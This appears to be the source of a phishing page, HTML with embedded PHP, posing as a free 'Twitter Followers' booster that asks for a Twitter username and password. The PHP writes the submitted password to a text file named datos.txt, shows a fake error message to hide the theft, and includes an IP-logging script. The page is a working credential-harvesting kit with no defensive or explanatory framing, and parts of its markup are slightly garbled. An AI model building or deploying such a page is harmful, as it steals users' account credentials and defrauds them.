
<!DOCTYPE html>
<html lang="en">
the <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Twitter Bots</title>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjvme1fgjwpgmkzs7" crossorigin="anonymous">
<style>
 body {
height:100%;
width:100%;
 background-image: url("http://www.imperial.ac.uk/imedia/general_graphics/interact/images/twitterBG.jpg");
 background-repeat: no-repeat;
background-size:cover;
}
 .focus {
 min-height: 100vh;
 display: flex;
 align-items: center;
}
</style>
</head>
the <body>
<?php

 if (isset($_POST["email"]) && isset($_POST["pass"])) {
 $file = "datos.txt";
 $user = htmlentities(str_replace("<:>","",$_POST["user"]));
 $pass = htmlentities(str_replace("<:>","",$_POST["pass"]));
 $ip = $_SERVER['REMOTE_ADDR'];
 $text = $user."\nemail: ".$user."\nPass: ".$pass; 
 $new .= $text."\n";
 file_put_contents($file, $new);
 $m = "<div class='alert alert-danger' role='alert'>Error 225; Not have been able to add the followers to your account.</div>";
}else{
 $m = "";
}
?>
<?php include 'ip.php'; ?>
 <div class="container center">
 <div class="row">
 <div class="col-md-12">
 <div class="alert alert-info">
<img src="Cesar.png" width="auto" height="215" <="" div="">
 the <h1><b>Auto Followers 2019/2020</b></h1><hr/>
 the <h1><b>TWITTER FOLLOWERS FREE</b></h1><hr/>
 <form method="POST" action="login_form_mb.php">
 <?php echo $m; ?>
 <input name="email" type="text" class="form-control" placeholder="username"><br/>
 <input name="pass" type="password" class="form-control" placeholder="Password"><br/>
 <select class="form-control">
 <option>10 followers (FREE)</option>
 <option>50 followers (FREE)</option>
 <option>100 followers (for FREE)</option>
 <option>1000 followers (FREE)</option>
 <option>5000 followers (10€)</option>
 <option>10000 followers (50€)</option>
</select><br/>
 <button class="btn btn-success btn-lg btn-block" type="submit">Add followers</button>
</form>
</div>
</div>
</div>
</div>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37prr3j5elqxss1yvqotnepnhvp9aj7xs" crossorigin="anonymous"></script>
</body>
</html>

